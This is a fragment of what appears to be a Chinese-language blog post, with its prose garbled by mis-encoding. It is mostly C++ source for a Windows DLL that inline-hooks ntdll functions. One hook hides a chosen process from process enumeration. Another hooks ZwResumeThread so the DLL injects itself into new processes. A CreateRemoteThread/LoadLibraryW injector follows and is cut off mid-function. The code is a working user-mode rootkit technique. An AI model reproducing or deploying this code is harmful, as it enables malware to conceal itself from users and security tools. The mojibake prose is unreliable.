class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/SECTION:.SHARED,RWS&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.SHARE&quot;</span>)</span></span><br><span class="line">TCHAR g_szProcName[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">setProcName</span><span class="params">(LPCTSTR szProcName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_tcscpy_s(g_szProcName, szProcName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//PZwQuerySystemInformation</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A70  mov         r10, rcx</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A73  mov         eax, 36h</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A78  test        byte ptr[7FFE0308h], 1</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A80  jne         00007FFBF7E50A85</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A82  syscall</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A84  ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BYTE orgBytesA[<span class="number">14</span>];</span><br><span class="line">BYTE orgBytesB[<span class="number">14</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwQuerySystemInformation)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwResumeThread)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE threadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG SuspendCount</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_THREAD_BASIC_INFORMATION</span> &#123;</span><br><span class="line">NTSTATUS ExitStatus;</span><br><span class="line">PVOID TebBaseAddress;</span><br><span class="line">CLIENT_ID ClientId;</span><br><span class="line">KAFFINITY AffinityMask;</span><br><span class="line">KPRIORITY Priority;</span><br><span class="line">KPRIORITY BasePriority;</span><br><span class="line">&#125; THREAD_BASIC_INFORMATION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">FARPROC <span class="title">getProc</span><span class="params">(std::string moduleName, std::string processName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(moduleName.<span class="built_in">c_str</span>()), processName.<span class="built_in">c_str</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hookByCode</span><span class="params">(std::string moduleName, std::string processName, PROC pFuncNew, PBYTE orgBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE jmpcode[<span class="number">14</span>] = &#123; <span class="number">0xff</span>,<span class="number">0x25</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line">FARPROC orgFunc = <span class="built_in">getProc</span>(moduleName, processName);</span><br><span class="line">PBYTE pOrgFunc = <span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(orgFunc);</span><br><span class="line"><span class="keyword">if</span> (pOrgFunc[<span class="number">0</span>] == <span class="number">0xff</span> &amp;&amp; pOrgFunc[<span class="number">1</span>] == <span class="number">0x25</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(pOrgFunc, <span class="number">14</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¿å­˜åŸå§‹ä»£ç </span></span><br><span class="line"><span class="built_in">memcpy</span>(orgBytes, pOrgFunc, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//8BYTEè·³è½¬ä¸ºç»å¯¹åœ°å€</span></span><br><span class="line">DWORD64 targetAddr = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(pFuncNew);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;jmpcode[<span class="number">6</span>], &amp;targetAddr, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(pOrgFunc, jmpcode, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(pOrgFunc, <span class="number">14</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">unhookByCode</span><span class="params">(std::string moduleName, std::string processName, PBYTE orgBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FARPROC orgFunc = <span class="built_in">getProc</span>(moduleName, processName);</span><br><span class="line">PBYTE pOrgFunc = <span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(orgFunc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(pOrgFunc[<span class="number">0</span>] == <span class="number">0xff</span> &amp;&amp; pOrgFunc[<span class="number">1</span>] == <span class="number">0x25</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(pOrgFunc, <span class="number">14</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(pOrgFunc, orgBytes, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(pOrgFunc, <span class="number">14</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">myZwQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG ReturnLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">unhookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;NtQuerySystemInformation&quot;</span>, &amp;orgBytesA[<span class="number">0</span>]);</span><br><span class="line">PZwQuerySystemInformation pZwQuerySystemInformation = <span class="built_in">reinterpret_cast</span>&lt;PZwQuerySystemInformation&gt;(<span class="built_in">getProc</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>));</span><br><span class="line">NTSTATUS status = <span class="built_in">pZwQuerySystemInformation</span>(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);</span><br><span class="line"><span class="keyword">if</span> (status != STATUS_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> end;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (SystemInformationClass == <span class="number">5</span> &amp;&amp; g_szProcName[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">PSYSTEM_PROCESS_INFORMATION pInfo = <span class="built_in">static_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(SystemInformation);</span><br><span class="line">PSYSTEM_PROCESS_INFORMATION pNextInfo = <span class="built_in">reinterpret_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(<span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(pInfo) + pInfo-&gt;NextEntryOffset);</span><br><span class="line"><span class="keyword">while</span> (pNextInfo-&gt;NextEntryOffset)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!_tcsicmp(pNextInfo-&gt;ImageName.Buffer, g_szProcName))</span><br><span class="line">&#123;</span><br><span class="line">pInfo-&gt;NextEntryOffset += pNextInfo-&gt;NextEntryOffset;</span><br><span class="line">&#125;</span><br><span class="line">pInfo = pNextInfo;</span><br><span class="line">pNextInfo = <span class="built_in">reinterpret_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(<span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(pInfo) + pInfo-&gt;NextEntryOffset);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">end:</span><br><span class="line"><span class="built_in">hookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;PROC&gt;(myZwQuerySystemInformation), &amp;orgBytesA[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>, hThread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID))) &#123; <span class="comment">// å–å¾—å¯¹åº” PID å¥æŸ„</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;Open process %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line"></span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;Memory allocation failed in process %d\n&quot;), dwPID);</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;WriteProcessMemory failed in process %d\n&quot;), dwPID);</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HMODULE hKernel32 = <span class="built_in">GetModuleHandle</span>(_T(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (hKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;GetModuleHandle failed\n&quot;));</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pThreadProc == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;GetProcAddress failed\n&quot;));</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;CreateRemoteThread failed in process %d\n&quot;), dwPID);</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">1500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;DLL injected successfully into process %d\n&quot;), dwPID);</span></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">myZwResumeThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE threadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG SuspendCount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* ZwQueryInformationThread_t)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD ThreadInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID ThreadInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG ThreadInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG ReturnLength OPTIONAL</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line">THREAD_BASIC_INFORMATION tbi;</span><br><span class="line">FARPROC pqit = <span class="built_in">getProc</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQueryInformationThread&quot;</span>);</span><br><span class="line">NTSTATUS statusThread = <span class="built_in">reinterpret_cast</span>&lt;ZwQueryInformationThread_t&gt;(pqit)(threadHandle, <span class="number">0</span>, &amp;tbi, <span class="built_in">sizeof</span>(tbi), <span class="literal">NULL</span>);</span><br><span class="line">DWORD dwPid = <span class="built_in">reinterpret_cast</span>&lt;DWORD&gt;(tbi.ClientId.UniqueProcess);</span><br><span class="line">DWORD dwPrevPid = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (dwPid != <span class="built_in">GetCurrentProcessId</span>() &amp;&amp; dwPid != dwPrevPid)</span><br><span class="line">&#123;</span><br><span class="line">dwPrevPid = dwPid;</span><br><span class="line"><span class="built_in">inject</span>(dwPid, <span class="string">L&quot;C:\\Users\\a2879\\source\\repos\\HideProcess\\x64\\Debug\\HideProcess.dll&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">unhookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>, &amp;orgBytesB[<span class="number">0</span>]);</span><br><span class="line">PZwResumeThread pZwResumeThread = <span class="built_in">reinterpret_cast</span>&lt;PZwResumeThread&gt;(<span class="built_in">getProc</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>));</span><br><span class="line">NTSTATUS status = <span class="built_in">pZwResumeThread</span>(threadHandle, SuspendCount);</span><br><span class="line"></span><br><span class="line"><span class="built_in">hookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;PROC&gt;(myZwResumeThread), &amp;orgBytesB[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">setProcName</span>(<span class="string">L&quot;Notepad.exe&quot;</span>);</span><br><span class="line"><span class="function">std::string <span class="title">curProc</span><span class="params">(MAX_PATH, <span class="string">&#x27;\0&#x27;</span>)</span></span>;</span><br><span class="line"><span class="type">char</span>* p = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="built_in">GetModuleFileNameA</span>(<span class="literal">nullptr</span>, &amp;curProc[<span class="number">0</span>], curProc.<span class="built_in">size</span>());</span><br><span class="line">p = <span class="built_in">const_cast</span>&lt;<span class="type">char</span>*&gt;(<span class="built_in">strrchr</span>(curProc.<span class="built_in">c_str</span>(), <span class="string">&#x27;\\&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">nullptr</span> &amp;&amp; !_stricmp(p + <span class="number">1</span>, <span class="string">&quot;DLL_inject.exe&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line"><span class="comment">/*CreateThread(nullptr, 0, startHide, nullptr, 0, nullptr);*/</span></span><br><span class="line"><span class="built_in">hookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;PROC&gt;(myZwQuerySystemInformation), &amp;orgBytesA[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">hookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;PROC&gt;(myZwResumeThread), &amp;orgBytesB[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨å…¥å™¨æœ¬æ¥åº”è¯¥å®ç°å…¨å±€æ³¨å…¥ï¼Œä½†æ˜¯ç”±äºæˆ‘è¿™è¾¹ä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸€æ³¨å°±æŒ‚ï¼Œæ‰€ä»¥å°±æ²¡æœ‰å…¨å±€ï¼Œåªå•ç‹¬é€‰æ‹©äº†exploerï¼Œè¿™é‡Œçš„ä»£ç å’Œä¹‹å‰çš„æ˜¯ä¸€æ ·çš„ï¼Œå¦‚æœæƒ³ç»§ç»­æµ‹è¯•å…¨å±€æ³¨å…¥ï¼Œå¯ä»¥è¯•è¯•ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Is64BitProcess</span><span class="params">(DWORD dwPID)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwPID);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL isWow64 = FALSE;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">IsWow64Process</span>(hProcess, &amp;isWow64)) &#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> !isWow64;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>, hThread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID))) &#123; <span class="comment">// å–å¾—å¯¹åº” PID å¥æŸ„</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;Open process %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line"></span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Memory allocation failed in process %d\n&quot;</span>), dwPID);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;WriteProcessMemory failed in process %d\n&quot;</span>), dwPID);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HMODULE hKernel32 = <span class="built_in">GetModuleHandle</span>(_T(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> 